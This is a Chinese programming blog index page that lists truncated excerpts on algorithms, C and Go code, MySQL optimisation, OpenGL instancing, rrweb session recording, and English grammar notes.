	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d46cf7e4c3a3fe07d031aa350e42bfbc/" rel="bookmark">
			DDA直线插补算法原理与实现（matlab）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DDA直线插补算法 数值微分法即DDA法(Digital Differential Analyzer)，是一种基于直线的微分方程来生成直线的方法。
直线DDA算法描述 设(x1，y1)和(x2，y2)分别为所求直线的起点和终点坐标，由直线的微分方程得：
d y / d x = ( y 2 − y 1 ) / ( x 2 − x 1 ) = △ y / △ x = m = 直 线 斜 率 dy/dx=(y2-y1)/(x2-x1)=△y/△x=m=直线斜率 dy/dx=(y2−y1)/(x2−x1)=△y/△x=m=直线斜率
可通过计算由x方向的增量△x引起y的改变来生成直线：
x i + 1 = x i + △ x x_{i+1}=x_i+△x xi+1​=xi​+△x
y i + 1 = y i + △ y = y i + △ x ⋅ m y_{i+1}=y_i+△y=y_i+△x·m yi+1​=yi​+△y=yi​+△x⋅m
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d46cf7e4c3a3fe07d031aa350e42bfbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d298b060d3de259f5e6a2f83b13ce2e4/" rel="bookmark">
			linux  查看指定时间段的日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、查看时间段日志：sed -n ‘/起始时间/,/结束时间/p’ 日志文件
sed -n '/2021-05-21 10:08/,/2021-05-21 10:09/p' nohup.out 2、指定时间点的日志，并导出到单独文件中
sed -n '/2021-05-21 10:08/,/2021-05-21 10:09/p' nohup.out &gt; nohup0521.out 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ea9b4a2ab43495961b51bea63e1722d/" rel="bookmark">
			Go语言中字典树的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 字典树在存储、查询方面应用广泛。所以特总结一下，利用GO语言实现字典树。
具体实现 字典树的实现主要还是基于树形结构，如果只是小写字母的话，那其实字典树是一个26叉树，每个节点最多都可以有26个子节点。从而可以利用一个长度为26的数组来记录某个节点的子节点情况。并且每个节点可以使用一个布尔标志位来划定是否是一个单词，这是关键所在，具体代码见下：
type Trie struct { children [26]*Trie isEnd bool } func Constructor() Trie { return Trie{} } func (t *Trie) Insert(word string) { node := t for _, ch := range word { ch -= 'a' if node.children[ch] == nil { node.children[ch] = &amp;Trie{} } node = node.children[ch] } node.isEnd = true } func (t *Trie) SearchPrefix(prefix string) *Trie { node := t for _, ch := range prefix { ch -= 'a' if node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ea9b4a2ab43495961b51bea63e1722d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/101fc9dc8a96c314c3cb58e5d4b84229/" rel="bookmark">
			基于rrweb框架对web 页面录制与回放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官方文档:https://github.com/rrweb-io/rrweb/blob/0f86a72705b998a9abf5b4aae5b01a4f3b679954/guide.zh_CN.md
前言 最近来了个需求需要对web 页面上的操作行为做流程跟踪，并提供具体的数据,或者视频参照，作为合规的证据代码用户的操作轨迹，也避免一些纠纷。
对于web 页面的轨迹追踪，还需要知道操作行为。一想到这个第一想到的就是在线直播学习课程中，找个屏幕录播软件，讲解员打开该软件，开始在电脑上的一切行为都被录制成视频。然后就可以直接把视频分享给所有的人。而你再讲解过程中的一些列细节都能够播放出来。所以当初就想让原生APP开发一个这样类似的东西。再webview中进行播放。这样功能也就ok了。但是还是需要支持移动端web 网页的轨迹追踪。
解决问题方式 思路一：Canvas
利用Canvas截图，使用 html2canvas 库，不停的画页面然后不停的截图，再讲图片播放出来。后来调研了一下~ 发现这个可操作性几乎未零。太复杂了，数据量右大，而我们的页面又复杂，canvas 画半天耗内存，有时候会卡主。直接pass了
思路二：记录页面DOM变化
主要原理是：MutationObserver接口提供了监视对DOM树所做更改的能力。我们可以利用这个接口，保存每次变化的DOM数据，然后把这些数据转换成可视化的数据结构，然后给一个个保存起来。然后我们使用特定的方式对一个个保存起来的DOM数据进行还原并重新渲染出来。DOM节点的变化也就意味了页面轨迹发送了变化。这样就可以把这些轨迹记录下来。我们只需要再把这个还原出来的DOM播放的过程中进行录制，这样就可以保持下来这些轨迹视频。
进行实践
后续调研，以及其他同事的帮助，我们找到了LogRocket ,专业的web app用户行为记录工具，官网描述：
LogRocket记录用户在你的web上做的一切事情，以帮助你重现bug并更快的解决他们
在你的web app中发现问题不应该如此艰难
用LogRocket，重现问题就像他们发生在你自己的浏览器中一样
按照其描述，以及我们的进一步了解，发现LogRocket 里面的一些东西确实可以帮助我们解决问题。但是主要问题是还是因为LogRocket 这些数据，我们无法获取到自己的库里面。只能是第三方的库。并不满足我们的需求，还是就是要用它，需要花钱。
大家想深入的了解，可以查看官网 LogRocket 官网
后来我们又了解到一个开源的 rrweb 框架。rrweb主要由3部分组成：
rrweb-snapshot，包括快照和重建功能。快照用于将DOM及其状态转换为具有唯一标识符的可序列化数据结构; 重建功能是将快照重建为相应的DOM。
rrweb，包括两个功能：记录和重播。记录功能用于记录DOM中的所有动作变化; 重放是根据相应的时间戳逐个重放记录下的动作变化。
rweb-player是 rrweb的一个玩家用户界面，可以随时提供基于GUI的功能，如暂停，快进，拖放等功能。
使用这些我们可用于web界面录制以及web界面重放这两个主要功能，rrweb-snapshot 返回的数据结构是json格式的，方便我们前后台数据对接，也规范了这款业务逻辑操作。
rrweb 实践
引入库
(1) 直接通过script引入,推荐通过 jsdelivr 的 CDN 安装：
&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.css" /&gt; &lt;script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/rrweb.min.js"&gt;&lt;/script&gt; 我们在被录制的应用中只需要引入录制部分代码即可，无需全量引入。
&lt;script src="https://cdn.jsdelivr.net/npm/rrweb@latest/dist/record/rrweb-record.min.js"&gt;&lt;/script&gt; (2) 通过 npm 引入rrweb 同时提供 commonJS 和 ES modules 两种格式的打包文件，易于和常见的打包工具配合使用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/101fc9dc8a96c314c3cb58e5d4b84229/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/589295e2b1ebac6110b5d8a66f0de0b1/" rel="bookmark">
			后缀表达式转中缀表达式并计算结果代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; using namespace std; //后缀表达式转中缀表达式并计算表达式值 int compare(char,char); int compute(char c[]); void show(char c[]); int main() { char c[100],c2[100], prst[10];//c保存后缀表达式，c2为中缀表达式，prst表示字符栈 int top=-1; prst[++top]='#';//为了栈内无符号是便以比较 cin&gt;&gt;c; int i=0,j=0;//i为c2计数，j为c计数 while(c[j]!='\0') //开始遍历字符串 { if(c[j]&lt;=57&amp;&amp;c[j]&gt;=48) //若当前字符是数字 { c2[i++]=c[j++]; //注意i，j的变化 } else if(0==compare(c[j],prst[top])) //当前字符为右括号，出栈直到左括号出栈 { while(prst[top]!='(') { c2[i++]=prst[top--]; } j++; //右括号匹配完毕 top--; //左括号出栈 } else if(-1==compare(c[j],prst[top])) //小于等于，栈顶符号出栈，j不变继续与栈顶比较 { c2[i++]=prst[top--]; } else if(1==compare(c[j],prst[top])) //优先级大于栈顶元素或者栈顶为左括号入栈 { prst[++top]=c[j++]; } } while(top!=0) //当前字符串遍历完毕后，栈内的运输符出栈 { c2[i++]=prst[top--]; } show(c2); //打印 cout&lt;&lt;compute(c2)&lt;&lt;endl; return 0; } int compare(char str1 ,char str2)//比较两字符优先级 { if(str2=='#'||str2=='(') return 1; switch(str1) { case ')': return 0; break; case '(': return 1; break; case '*': case '/': if(str2=='*'||str2=='/') return-1; else return 1; break; case '+': case '-': return -1; break; default : return 99; break; } return -1; } int compute(char c[]) { int i=0; int top1=-1; int prsd[10]; while(c[i]!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/589295e2b1ebac6110b5d8a66f0de0b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/043801d39c68a4165fb42cf536885a5c/" rel="bookmark">
			c语言other用法,another 与 other的用法与区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1。c 这个孩子想再要一个桔子。
2。c 我们必须考虑到别人。
以下是有关的other,another, the other, others,the others 等的区别。希望对你有所帮助。
e other +(one/单数名词)表示两者中的另一个
I have two books。
One is an English boy,the other (one/book)is a Chinese book。
other+(one/单数名词)表示三者或三者以上中的另一个 This hat doesn't fit。 I'd like to try another。
He didn't return the book to me。 Instead he borrowed another (one/book) from me。
Please give me another umbrella。 This one is too old。
other还可表示“又一的,再一个(或一批)的”与more相似,但词序不同。 after another week又一星期之后 have another glass of milk 再喝一杯牛奶
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/043801d39c68a4165fb42cf536885a5c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f4248cf774b17e6b4709bb50a32bb87/" rel="bookmark">
			c语言other用法,another和other的用法急求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		another与other的区别。①SomestudentslikeEnglishandotherstudents(others)likephysics.有些学生喜欢英语，有些学生喜欢物理。【解析】other表示“别的”，“另外的”，只能与复数名词连用。但other前有冠词the即可与单数名词连用。如：Ihavetwopens.Oneisblue.Theother(pen)isblack.我有两枝钢笔。一支是蓝色的，另一支是黑色的。②Johndidbetterthanalltheotherplayersinthesport.在那项运动中John比所有别的运动员都出色。【解析】theother加复数名词指的是一定范围内“所有其余的人或事物”，是特指；而other加复数名词却是没有明确范围的“另外的人或事物”。如：Wemustthinkmoreofothercomrades.我们必须多想想别的同志。③Thisshirtistoolargeforme.Pleaseshowmeanother.这件衬衫我穿太大。请另外拿一件我看看。(一般商店不会只有两件衬衫)【解析】another,theother作代词的用法。Theother表示“两个数量中的另一个”，表示特指，总数为俩；another表示“总数为三个以上中任意的另一个”，表示泛指。如：Hisparentsbothworkinahospital.Oneisadoctorandtheotherisanurse.他父母都在一家医院工作。一个是医生，一个是护士。(父母为两个人)其他习惯用法oneanother,fromone…toanother,theotherday=afewdaysago，everyotherday/week/year，some…,others…，如：ImetMr.Smithintheparktheotherday.前几天我在公园里碰见了Smith先生。Whileattheuniversity,hewenttothelibraryeveryotherday.在大学时他每隔一天去图书馆一次。Somepeoplelikefootball,otherslikevolleyball.有些人喜欢足球，有些人喜欢排球。Theyareverydifferentfromoneanother.他们互相之间差别很大。WhenAmericansmovedfromoneplacetoanother,theytooktheirdialectswiththem.当美国人从一个地方迁移到另一个地方时，other指另外的人或物；other泛指别人，可与some连用；theother指两个中的另一个，常和one连用；theothers表示其余所有的人或物；another则泛指另一个。other可以做形容词，表示其他的，比如otherpeople其他的人。也可以做代词，但是做代词时一般不以原形出现，一般用以"theother"或者以复数形式“others”出现。others和some对比使用时,是“有些”的意思而不是做“其他”讲,如:Somecleanedthewindows,othersmoppedthefloor.有的擦窗户,有的擦地板。theothers是“其余的”意思,表示在一个范围内的其他全部,如:Thisdictionaryisbetterthantheothers.这本字典比别[其余]的好。theother是其中的“另一个”,如:Givemetheotherone;notthisone.给我那一个,不是这一个。两个中的“另一个”是“theother”;不定数目中的“另一个”是“another”,如:Thisglassisbroken.Getmeanother.这个杯子坏了,给我另拿一个来。(在许多杯子中的一个)
阅读全文 &gt;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/316032a21d3d5443e3c7bf809372cbba/" rel="bookmark">
			c语言other用法,other的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、other作形容词的用法：
1、other用作形容词作“别的,其他的,另外的”解时,常用来修饰复数名词或不可数名词; 如前面有this, that, some, any, each, every, no, none, one等词时,也可用来修饰单数名词。
2、other用在the或形容词性物主代词之后时,与单数名词连用表示“(两个中的)另一个”; 与复数名词连用表示某一集体中“其余的,剩下的(人或物)”。
二、other作代词的用法：
1、other用作代词时常用于复数形式,表示“其他的,别的或另外的人〔事物〕”; others若用于the或表示所属关系的限定词后,则表示“其余的人〔事物〕”,即把剩下的全部包括在内。
2、other也可用于单数形式,表示“(两者中的)另一个(人或事物)”,常与the连用。
扩展资料
一、other 读法 英 ['ʌðə] 美 ['ʌðɚ]
1、adj. 其他的，另外的
2、pron. 另外一个
短语：
1、no other [古语]仅此而已
2、every other 所有其他的；每隔一个的
3、other one 其他的
4、among others 其中；尤其；除了别的之外
5、at other times 在其它时候，平时
例句：
1、The new Station Centre will have shops, restaurants and other amenities.
新的中央车站将会有商店、饭店及其他设施。
2、When the other kids were taken to the zoo, he was left behind.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/316032a21d3d5443e3c7bf809372cbba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8d40162993c9f397ec029d1dc3025dd/" rel="bookmark">
			OPenGL实例化绘制、普通绘制说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OpenGL 实例化（Instancing）是一种只调用一次渲染函数就能绘制出不少物体的技术，能够实现将数据一次性而不是多次发送给 GPU ，告诉 OpenGL使用一个绘制函数，将这些数据绘制成多个物体。数组实例化（Instancing）避免了 CPU 屡次向 GPU 下达渲染命令（避免屡次调用 glDrawArrays 或 glDrawElements 等绘制函数），节省了绘制多个物体时 CPU 与 GPU 之间的通讯时间，提高了渲染性能。 实例化是因为Verilog等语言里面有实例化，相当于提前定义好的一个模块，在别的模块中可以直接调用（即例化）。OpenGL的实例化与Verilog的例化很像，所以名字叫这个，本质上是对一个模块的多次调用，和批量渲染是一个意思。
//普通渲染 glDrawArrays (GLenum mode, GLint first, GLsizei count); glDrawElements (GLenum mode, GLsizei count, GLenum type, const void *indices); //实例化渲染 glDrawArraysInstanced (GLenum mode, GLint first, GLsizei count, GLsizei instancecount); glDrawElementsInstanced (GLenum mode, GLsizei count, GLenum type, const void *indices, GLsizei instancecount); 相对于普通绘制，实例化绘制多了一个参数instancecount，表示须要渲染的实例数量，调用完实例化绘制函数后，咱们便将绘制数据一次性发送给 GPU，而后告诉它该如何使用一个函数来绘制这些实例。编辑器
实例化（Instancing）的目标并非实现将同一物体绘制屡次，而是能基于某一物体绘制出位置、大小、形状或者颜色不一样的多个物体。glDrawArraysInstanced函数内部实现如下：
if ( mode or count is invalid ) generate appropriate error else { for (int i = 0; i &lt; primcount ; i++) { instanceID = i; glDrawArrays(mode, first, count); } instanceID = 0; } 其中上诉伪代码中的instanceID就是类似于OpenGL 着色器中有一个与实例化绘制相关的内建变量 gl_InstanceID。性能
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8d40162993c9f397ec029d1dc3025dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a7516d356b244de2a960b61623a1c3d/" rel="bookmark">
			js中的观察者模式 和发布订阅模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js中的观察者模式 和发布订阅模式 ​ 前言:作为一个职场小白,这个面试题是有机会问到的,我也没有去了解过这个方面,我知道有这个东西的时候是,问新同事的面试题什么才知道有这个东西!其实我们使用vue,里面也有发布订阅模式,下面我使用了nodejs的例子阐述下,这两种模式
观察者模式: //在观察者模式中,只有两个角色 目标&lt;--&gt;观察者 者两个
//举例代码 // 被观察者 小宝宝 心情好和不好 //function Subject(name){this.name = name this.observers = []} 也可以使用构造函数写法 class Subject { constructor(name) { this.name = name this.observers = [] //被观察者要放在 观察者中 this.status = '开心' } // 被观察者要提供一个接受观察者的方法 watchFn (observer) { //Subject.prototype.watchFn(observer){...} //相当于构造函数写法 this.observers.push(observer) //存放所有的观察者 } //更改小宝宝状态的方法 setState (newState) { this.state = newState this.observers.forEach(o =&gt; o.update(newState)) //发布订阅模式 } } class Observer { constructor(name) { this.name = name } update (newState) { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a7516d356b244de2a960b61623a1c3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67dd93a05d5938973a8a9d0a36a51254/" rel="bookmark">
			输入一个四位数将其加密后输出c语言,从键盘输入一个四位数-按如下规则加密后输出...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《从键盘输入一个四位数-按如下规则加密后输出》由会员分享，可在线阅读，更多相关《从键盘输入一个四位数-按如下规则加密后输出(3页珍藏版)》请在人人文库网上搜索。
1、作业31、 从键盘输入一个四位数，按如下规则加密后输出。加密规则：每位数字都加上7，然后用和除以10的余数取代该数字，再把第一位与第三位交换，第二位与第四位交换。clearx=ones(1,4);x(1)=input(输入第一位：);x(2)=input(输入第二位：);x(3)=input(输入第三位：);x(4)=input(输入第四位：);x=rem(7+x,10);y=1000.*x(3)+100.*x(4)+10.*x(1)+x(2)2、 分别用if语句和switch语句实现以下计算，其中a，b，c的值从键盘输入。a=input(请输入a:);b=input(请输入b:);c=inp。
2、ut(请输入c:);if(x=0.5&amp;x=1.5&amp;x=3.5&amp;x=0.5&amp;x=1.5&amp;x=3.5&amp;x=5.5) y=log(abs(b+c./x)end3、 已知分别用循环结构和调用MATLAB的sum函数求s的值。cleara=2;s=0;for n=0:63s=a.n+s;endss =1.8447e+019n=0:63;s=sum(2.n)s =1.8447e+019作业41、 绘制下列曲线，要求采用不同的点型，线型和颜色。(1) (2) 2、绘制下列极坐标图，在同一个窗口中采用子图形式实现。(1) (2) 3、绘制下列三维图形(1) (2)半径为10的球面 4、某工厂2005年度各季度产值(单位：万元)分别为：450.6、395.9、410.2、450.9，试绘制折线图和饼图，并说明图形的实际意义。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2717a627e3ac24fb52c24750e08d9632/" rel="bookmark">
			孙子算经余数C语言,《孙子算经》运用中国剩余定理巧妙解题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《孙子算经》运用中国剩余定理巧妙解题
我国古代数学名著《孙子算经》载有一道数学问题：“今有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？”这里的几何指多少的意思。翻译成数学语言就是：求正整数N，使N除以3余2，除以5余3，除以7余2。
如何求符合上述条件的正整数N呢？《孙子算经》给出了一个非常有效的巧妙解法。术曰：“三、三数之剩二，置一百四十；五、五数之剩三，置六十三；七、 七数之剩二，置三十，并之，得二百三十三。以二百一十减之，即得。凡三、三数之剩一，则置七十；五、五数之剩一，则置二十一；七、七数之剩一，则置十五。 一百六以上，一百五减之，即得。”
过了一千多年，到了十六世纪，数学家程大位在他所著的《算法统宗》里把这个问题的解法用歌诀形式表述出来。三人同行七十稀， 五树梅花廿一枝，七子团圆正月半，除百零五便得之。
歌诀的前三句给出了三组数，后一句给出了一个数：
3 70
5 21
7 15
105
三组数的共同特征是：
70除以3余1，除以5、7余0； 21除以5余1，除以3、7余0； 15除以7余1，除以3、5余0。
首先程大位把不同的余数问题统一化为标准的余数问题。然后，他把复杂难解的问题化解为三个易解的问题。70、21、15分别是满足第一、二、三行条件的最小解。
2×70满足原题第一个余数条件，且被5、7整除。
3×21满足原题第二个余数条件，且被3、7整除。
2×15满足原题第三个余数条件，且被3、5整除。
统统相加得和：N=2×70+3×21+2×15=233。
N必然满足原题所有三个余数条件。但N不一定是最小的。歌诀最后一句“除百零五便得知”，这里“除”的意思是“减”，意即从233中减去3、5、7的 最小公倍数105的倍数便得到23。这个23就是问题的最小解。这最后一句也可以理解为N除以105的余数就是问题的最小解。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddaff4e537a9197158f6dcebfb31d3f5/" rel="bookmark">
			MySQL索引实战二: 深度分页优化、join连接查询优化、in和exists优化、count(*)查询优化、阿里MySQL规范解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、分页查询优化 很多时候我们业务系统实现分页功能可能会用如下sql实现：
select * from employees limit 10000,10; 表示从表 employees 中取出从 10001 行开始的 10 行记录。看似只查询了 10 条记录，实际这条 SQL 是先读取 10010条记录，然后抛弃前 10000 条记录，然后读到后面 10 条想要的数据。因此要查询一张大表比较靠后的数据，执行效率是非常低的。这是典型的深度分页问题。
分页场景优化技巧 1、根据自增且连续的主键排序的分页查询 首先来看一个根据自增且连续主键排序的分页查询的例子：
select * from employees limit 90000,5; 该 SQL 表示查询从第 90001开始的五行数据，没添加单独 order by，表示通过主键排序。我们再看表 employees ，因为主键是自增并且连续的，所以可以改写成按照主键去查询从第 90001开始的五行数据，如下：
select * from employees where id &gt; 90000 limit 5; 查询的结果是一致的。我们再对比一下执行计划：
EXPLAIN select * from employees limit 90000,5; EXPLAIN select * from employees where id &gt; 90000 limit 5; 显然改写后的 SQL 走了索引，而且扫描的行数大大减少，执行效率更高。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddaff4e537a9197158f6dcebfb31d3f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa115f6d765d376ca0fa7b79e31b3929/" rel="bookmark">
			单片机C语言怎么完成两个任务,单片机可以同时处理多个任务吗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单片机可以按分时、顺序、中断的方法处理多个任务。
程序是非常抽象的，程序质量的好与差直接影响到运行的效果。我们用单片机设计电子产品时，同时运行多个任务是很正常的。单片机是按顺序执行指令的，所以，主程序也是按着顺序从头到底的运行的。以C语言写的单片机程序为例，一般以main()作为主函数，利用while(1)不断循环要执行的任务程序。在实时性要求不同的应用场合，顺序运行就可以了，实时性要求很高的任务一般用中断来处理，如果想平衡各个任务的运行时间，可以分时处理。
中断处理实时性高任务
中断可以理解为中途打断，比如你正在工作，突然领导来电话了，当你认为领导电话比较重要的时候，就可以先保存正在进行的工作进度，接听领导电话，然后再接着你的工作。单片机程序也是一样的。高优级的任务可以设置为中断，比如按键输入中断或者串口接收中断。以串口接收中断为例，假如单片机配置了串口接收中断，当串口接收到数据时，主程序就会被打断，保护现场数据后马上跳到串口接收中断程序，串口接收中断程序处理完成后，再返回主程序接着运行。
分时处理多个任务
可以用分时的方案平衡各个任务的处理时间，比如，我们可以引入一个计数器i，假如有5个任务，可以让i在0~4之不断循环，当i=0时执行任务1，当i=1时执行任务2，当i=3时执行任务4，当i=4时执行任务5就可以了。
当然，你还可以用定时器中断做一个计时器，0~1ms时运行任务1，1~2ms时运行任务2，2~3ms时运行任务3，3~4ms时运行任务4，4~5ms时运行任务5。如果有更高的要求的话，还要以用到嵌入式操作系统了，比如FreeRTOS、uCos。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a0f7e28ec92d51607008c95ac84be21/" rel="bookmark">
			什么是Spring？谈谈你对IOC和AOP的理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		​ Spring是一个企业级Java应用框架，它的作用主要是简化软件的开发流程以及配置过程，简化项目部署环境。
​ Spring的优点：
​ 1、Spring的低侵入式设计，对业务代码的污染非常低。
​ 2、Spring的DI机制将对象之间的关系交由框架处理，减少组件之间的耦合。
​ 3、Spring提供了AOP技术，支持将一些通用的功能进行集中式管理，从而提供更好的复用。
​ 4、Spring对于主流框架提供了非常好的支持。
IOC：将创建对象的控制权交给Spring来进行管理。简单的来说就是应用不用取new对象了，而是全部交给Spring进行自动生产。IOC有三种注入方式：构造器注入、setter注入、根据注解注入。
AOP：面向切面编程。用于将那些与业务无关但是对多个对象产生影响的公共行为进行抽取并封装成一个可重用的模块。（比如：对所有的方法进行运行时间统计、日志管理。。。）AOP的核心就是动态代理。JDK的动态代理和CGLIB动态代理。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5bdf6a4f586766c267669a383ed00a99/" rel="bookmark">
			C语言求回归曲线方程,刚学了两星期C语言……试着写了个求回归直线的……
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		该楼层疑似违规已被系统折叠 隐藏此楼查看此楼
感觉不应该有bug了……
/*回归直线*/
#include"stdio.h"
#include"windows.h"
int reply(int i);
void main()
{
int i,bd,bd2,s=0,re=1;
double x,y,xp,yp,p,q,t,b,a,r;
printf("=====================================================================\n");
printf(" 这个程序可以帮您求回归直线，当您想结束程序时，请输入：0 0 结束。\n");
printf("=====================================================================\n\n");
do
{
xp=0,yp=0,p=0,q=0,t=0;
do
{
loop1:
fflush(stdin);
for(i=1,x=1;x!=0||y!=0;i++)
{
printf("请输入第%d组数据：",i);
s=scanf("%lf%lf",&amp;x,&amp;y);fflush(stdin);if(s!=2){re=reply(re);if(re==8)goto last;goto loop1;}
re=1;xp=xp+x;yp=yp+y;p=p+x*y;q=q+x*x;t=t+y*y;
}
printf("xp=%lf\nyp=%lf\np=%lf\nq=%lf\nt=%lf\n",xp,yp,p,q,t);
printf("\n警告！您现在就要结束程序吗？\n");
printf("==========================================");
printf("\n 1.是，我要得到回归直线方程\n 2.不，我要继续输入数据！\n");
printf("==========================================");
loop2:
printf("\n请输入您的选择：");
s=scanf("%d",&amp;bd);fflush(stdin);if(bd!=1&amp;&amp;bd!=2||s!=1){printf("警告！您的选择有误，请重新选择！\n");goto loop2;}
printf("\n");
}while(bd==2);
i-=2;b=(p-xp*yp/i)/(q-xp*xp/i);a=yp/i-b*xp/i;
r=((p-xp*yp/i)*(p-xp*yp/i))/((q-xp*xp/i)*(t-yp*yp/i));
printf("●●●●●●●●●●●●●●●●●●●●●●●●\n\n");
printf(" ◆ 回归直线方程为：y=%lfx",b);
if(a!=0&amp;&amp;a&gt;0)printf("+");
printf("%lf\n\n",a);
printf(" ◆ 相关系数的平方：R^2=%lf\n\n",r);
printf("●●●●●●●●●●●●●●●●●●●●●●●●\n");
printf("\n\n您要继续计算吗？\n");
printf("======================================\n");
printf(" 1.是的，我要继续计算\n");
printf(" 2.不啦！我现在就要退出\n");
printf("======================================\n");
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bdf6a4f586766c267669a383ed00a99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a96f0ecdad5d76a8fb1c0fcbbdfc8a6a/" rel="bookmark">
			c语言如何把输入的数存入数组中,//从键盘上输入若干整数，并将其存入数组中，并统计输入数据的个...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		该楼层疑似违规已被系统折叠 隐藏此楼查看此楼
//从键盘上输入若干整数，并将其存入数组中，并统计输入数据的个数。
#include
#include
#include
#include
int sum_num(char [],int []);
int cou_num(char [][81],int,int[]);
int txt(char [][81],int);
//主函数
main()
{
int a[100];
char s[100][81];
int i,m,n;
n=txt(s,81);
m=cou_num(s,n,a);
printf("输入的数据如下：\n");
for(i=0;i
printf("%d，",a[i]);
putchar(10);
printf("输入的数据个数为：%d\n",n);
}
//多行数据统计
int cou_num(char text[][81],int row,int num[])
{
int i,m=0;
for(i=0;i
m=sum_num(text[i],num);
return m;
}
//数据个数统计
int sum_num(char s[],int num[])
{
int i=0,j=0;
static n=0;
char temp[20]={'\0'};
do {
if(isdigit(s[i])||s[i]=='-')
temp[j++]=s[i];
else
{
temp[j]='\0';
if(strlen(temp)&gt;0)
num[n++]=atoi(temp);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a96f0ecdad5d76a8fb1c0fcbbdfc8a6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37ee4b52199f6f93f0b5117a0bd793f8/" rel="bookmark">
			差分方程求电位c语言代码,有限差分法求导体槽的静电场.doc
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有限差分法求导体槽的静电场
有限差分法中的迭代法求解接地金属槽内电位分布
一、实验原理
有限差分法是基于差分原理的一种数值计算法。其基本思想想是将场域离散成很多许多小的网格，应用差分原理，将求解连续函数的柏松方程问题转换为求解网格节点上的差分方程组问题。
1．1 二维柏松方程的差分格式
图1 有限差分法的网格划分
导体槽中静电场的边值问题的拉普拉斯方程为：
为简单起见，将场域分成足够小的正方形网格，网格线之间的距离为h，。节点0、1、2、3、4上的电位分别用、、、和表示。点1、点3在x0处可微，沿x方向在x0处的泰勒级数展开式为
点2、点4在y0处可微，沿y方向在y0处的泰勒级数展开式为
忽略高次项
稍作变化得到拉普拉斯方程的五点差分格式：
可通过迭代法求解以上差分方程。
1.2 高斯—赛德尔迭代法
进行迭代时可写为
,为行数，,为列数，为迭代次数，为前次迭代的结果，为当次迭代的结果，由于迭代从第一行、第一列开始，()、()点的迭代较()点进行得早，顾可使用当次迭代的结果。直到所有的点电位满足(为所设定精度)时迭代停止。
